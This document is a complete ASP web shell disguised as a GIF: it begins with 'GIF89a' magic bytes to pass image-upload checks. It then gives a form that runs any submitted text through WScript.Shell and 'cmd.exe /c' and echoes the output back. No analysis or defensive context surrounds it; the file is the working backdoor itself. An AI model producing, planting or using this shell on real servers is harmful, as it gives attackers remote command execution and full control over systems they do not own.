GIF89a<html>
<body>
<form method="GET" name="cmd">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<%
If Request("cmd") <> "" Then
    On Error Resume Next
    Set sh = CreateObject("WScript.Shell")
    Set ex = sh.Exec("cmd.exe /c " & Request("cmd"))
    Response.Write Server.HTMLEncode(ex.StdOut.ReadAll)
End If
%>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
